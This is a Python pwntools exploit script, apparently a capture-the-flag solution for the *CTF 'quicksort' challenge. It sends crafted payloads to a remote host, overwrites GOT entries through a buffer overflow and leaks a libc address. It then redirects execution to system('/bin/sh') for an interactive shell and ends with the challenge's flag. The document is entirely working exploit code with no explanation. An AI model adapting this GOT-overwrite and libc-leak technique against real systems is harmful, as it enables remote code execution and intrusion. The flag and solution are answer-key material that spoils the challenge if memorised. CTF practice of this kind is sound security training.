from pwn import *

#p = process('./quicksort')
p = remote('34.92.96.238',10000)
elf = ELF('./quicksort')
libc = ELF('./libc.so.6')
context.log_level = 'debug'

free_got = 0x804A018
main_addr = 0x8048816
stack_check_addr = 0x804A024
ret_addr = 0x080484ae
malloc_addr = 0x804A028

p.recvuntil('how many numbers do you want to sort?\n')
p.sendline('1')
p.recvuntil('the 1th number:')
payload = str(main_addr) + '\x00'
payload += 'A'*(16-len(payload)) + p32(1) + p32(0)*2
payload += p32(free_got)
p.sendline(payload)

p.recvuntil('how many numbers do you want to sort?\n')
p.sendline('3')
p.recvuntil('the 1th number:')
payload2 = str(ret_addr) + '\x00'
payload2 += 'A'*(16-len(payload2)) + p32(3) + p32(2)*2
payload2 += p32(stack_check_addr-8)
p.sendline(payload2)

p.recvuntil('Here is the result:\n-')
data = p.recv(9)
data = int(data,10)
getchar_addr = 0x100000000 - data
libc_base = getchar_addr - libc.symbols['getchar']
system_addr = libc_base + libc.symbols['system']
bin_addr = libc_base + libc.search('/bin/sh').next()
print hex(libc_base),hex(bin_addr)

p.recvuntil('how many numbers do you want to sort?\n')
p.sendline('1')
p.recvuntil('the 1th number:')
system_addr = 0x100000000 - system_addr
payload3 = '-' + str(system_addr) + '\x00'
payload3 += 'A'*(16-len(payload3)) + p32(1) + p32(0)*2
payload3 += p32(malloc_addr)
p.sendline(payload3)

p.recvuntil('how many numbers do you want to sort?\n')
#gdb.attach(p)
p.sendline('-'+str((0x100000000 - bin_addr)/4 - 1))

p.interactive()

#*CTF{lSkR5u3LUh8qTbaCINgrjdJ74iE9WsDX}
